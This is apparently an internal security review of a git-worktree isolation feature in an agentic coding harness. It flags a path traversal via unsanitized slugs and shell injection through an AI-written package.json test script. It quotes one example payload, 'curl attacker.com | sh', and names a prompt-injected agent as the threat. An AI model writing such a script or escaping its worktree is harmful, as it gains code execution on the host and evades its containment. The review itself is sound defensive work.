# Security Review: git-worktree-isolation — runGateInline cwd injection

**Overall Verdict: PASS** (2 warnings, 1 suggestion — no criticals)

Reviewed against final code state: commits `75945b5` (−b→−B, `.toLowerCase()`) and `2bc244d`
(runGateInline cwd parameter).

---

## Files Read

- `bin/lib/run.mjs` lines 1–30 (imports), 50–176 (runGateInline + worktree helpers),
  375–400 (detectGateCommand), 940–950 (worktree wiring in _runSingleFeature)
- `test/worktree.test.mjs` (all 264 lines)
- `.team/features/git-worktree-isolation/tasks/task-3/handshake.json`
- git log / git show for commits 75945b5 and 2bc244d

---

## Threat Model

**Internal agentic tool** — user launches the harness, AI agents build code inside
git worktrees, the harness runs tests and reviews. The adversary in scope is:

1. A compromised or prompt-injected AI agent that writes malicious files into the
   worktree before the gate runs.
2. A malformed feature name (from STATE.json or user input) that traverses the
   filesystem.
3. An untrusted feature name from a shared `.team/` configuration.

Enterprise-level CSRF/XSS threats are out of scope for this codebase.

---

## Findings

🟡 `bin/lib/run.mjs:161` — Path traversal: `slug` is used raw in
`join(mainCwd, ".team", "worktrees", slug)` but is never sanitized for path use.
`slugToBranch(slug)` strips path separators and `..` components, but its output is
used **only** for the git branch name (line 162) — not for the path. `path.join`
resolves `..` segments: `createWorktreeIfNeeded("../../evil", "/repo")` produces
`worktreePath = /repo/evil`, escaping `.team/worktrees/`. Fix: add a
`resolve`-then-`startsWith` guard after line 161, e.g.:
`if (!worktreePath.startsWith(join(mainCwd, ".team", "worktrees"))) throw new Error("unsafe slug");`

🟡 `bin/lib/run.mjs:58` + `bin/lib/run.mjs:388–394` — Shell injection from
AI-written worktree files: `detectGateCommand(cwd)` now reads from the **worktree**
directory (cwd = worktreePath since the change). It reads `package.json
scripts.test` verbatim and returns it as `cmd`. That `cmd` is then executed via
`execSync(cmd, { shell: true })` — the shell interprets it. An AI agent that writes
`"scripts": { "test": "curl attacker.com | sh" }` into the worktree's
`package.json` before the gate runs would achieve arbitrary code execution. This is
a realistic prompt-injection path in agentic systems. Mitigations to consider:
(a) allowlist gate commands to `npm test`, `npm run check`, `npm run build`,
`cargo test`, `python -m pytest`; or (b) detect the gate command from the **main**
project (mainCwd) rather than the worktree (where the AI writes).

🔵 `bin/lib/run.mjs:161–162` — Sanitization asymmetry: `slugToBranch` output
(sanitized) is used for the branch name while the raw `slug` is used for the path.
This looks like the slug is sanitized for both uses, but it isn't. Add a comment
noting that `worktreePath` uses the raw slug intentionally (and pair it with the
bounds check above) to prevent future maintainers from removing `slugToBranch`
thinking it's redundant.

---

## Criterion Results

### 1. Input Validation — FAIL (warning-level)

- `runGateInline` cwd param (line 52): not validated before use. Low severity since
  callers are internal and the default is `process.cwd()`. No test exercises an
  invalid cwd.
- `createWorktreeIfNeeded` slug (line 161): used raw for path construction without
  sanitization or bounds check. Exploitation requires controlling a feature name,
  which is realistic via STATE.json or user input. **No test exercises a traversal
  slug.**

### 2. Shell / Command Injection — FAIL (warning-level)

- `execSync(cmd, { shell: true })` (line 58): intentional — `&&` in multi-step gate
  commands requires a shell. But `cmd` is now sourced from AI-written worktree
  files, which is a new injection surface introduced by this feature.
- Pre-existing commands in `detectGateCommand` are safe constants; the risk is from
  `package.json` content written by the agent.

### 3. Secrets / Credentials — PASS

No secrets, tokens, or credentials are introduced, stored, or passed by the changed
code. Worktree paths and branch names are not sensitive.

### 4. Access Control / Filesystem Isolation — PARTIAL PASS

The worktree is isolated in `.team/worktrees/{slug}`. The isolation boundary holds
for clean slugs. It fails for traversal slugs (finding 1). The `--force` flag in
`removeWorktree` (line 174) is scoped to git worktree removal, not arbitrary FS
deletion. Auto-commit uses array args without `shell: true` (line 1156) — safe.

---

## Test Coverage for Security

| Scenario | Covered? |
|---|---|
| `runGateInline` uses provided cwd (not process.cwd()) | ✓ line 181 |
| Traversal slug escapes `.team/worktrees/` | ✗ no test |
| Gate cmd from AI-written `package.json` is untrusted | ✗ no test |
| `slugToBranch` path vs branch name asymmetry | ✗ no test |

---

## Summary

The cwd injection is correctly wired and tested. The two 🟡 findings are:

1. **Path traversal** — slug used raw in path; `slugToBranch` only protects branch
   names. A 2-line fix + 1 test closes this.
2. **AI-controlled gate command** — `detectGateCommand` now reads from the AI's
   worktree; shell injection is possible via `package.json scripts.test`. Consider
   locking gate command detection to mainCwd or allowlisting.

Neither blocks merge for an internal tool with a cooperative-AI threat model, but
both should be tracked in the backlog.
